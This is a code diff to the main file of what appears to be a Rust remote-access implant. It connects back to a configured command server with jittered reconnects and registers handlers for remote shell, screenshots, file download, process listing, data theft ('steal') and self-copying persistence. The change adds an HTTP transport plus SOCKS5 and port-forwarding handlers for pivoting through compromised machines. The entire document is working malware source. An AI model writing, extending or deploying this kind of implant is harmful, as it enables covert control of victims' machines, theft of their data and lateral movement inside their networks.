@@ -5,8 +5,11 @@ mod platform;
 mod persistence;
 mod dispatcher;
 mod commands;
+#[cfg(feature = "http-transport")] mod tunnel_client;
 
 use commands::{shell, file_list, file_download, screenshot, process_list, persist_status, persist_remove, steal};
+#[cfg(feature = "http-transport")]
+use commands::{socks5, portfwd};
 use oxide_shared::packet::Packet;
 use rand::Rng;
 use std::time::Duration;
@@ -29,6 +32,14 @@ async fn main() -> anyhow::Result<()> {
     dispatch.register("persist_remove", Box::new(persist_remove::PersistRemoveHandler));
     dispatch.register("steal", Box::new(steal::StealHandler));
 
+    #[cfg(feature = "http-transport")]
+    {
+        dispatch.register("socks5_start",
+            Box::new(socks5::Socks5StartHandler::new(config.clone())));
+        dispatch.register("portfwd_add",
+            Box::new(portfwd::PortFwdHandler::new(config.clone())));
+    }
+
     let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
         eprintln!("[!] copy_to_stable: {e}");
         std::env::current_exe().unwrap_or_default()
@@ -46,16 +57,28 @@ async fn main() -> anyhow::Result<()> {
     let mut backoff = RECONNECT_BASE;
     loop {
         eprintln!("[*] Connecting to {}:{}...", config.host, config.port);
-        match transport::TlsTransport::connect(&config).await {
-            Ok(mut transport) => {
+
+        #[cfg(feature = "http-transport")]
+        let result = match transport::HttpTransport::connect(&config).await {
+            Ok(mut t) => {
+                eprintln!("[+] HTTP transport ready");
+                backoff = RECONNECT_BASE;
+                t.run(&dispatch, &chain).await
+            }
+            Err(e) => Err(e),
+        };
+
+        #[cfg(not(feature = "http-transport"))]
+        let result = match transport::TlsTransport::connect(&config).await {
+            Ok(mut t) => {
                 eprintln!("[+] TLS handshake complete");
                 backoff = RECONNECT_BASE;
-                if let Err(e) = run_tls_session(&mut transport, &dispatch, &chain).await {
-                    eprintln!("[!] Session ended: {e}");
-                }
+                run_tls_session(&mut t, &dispatch, &chain).await
             }
-            Err(e) => eprintln!("[!] Connect failed: {e}"),
-        }
+            Err(e) => Err(e),
+        };
+
+        if let Err(e) = result { eprintln!("[!] Session ended: {e}"); }
         let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
         let delay = backoff * (1.0 + jitter);
         eprintln!("[*] Reconnecting in {delay:.1}s...");
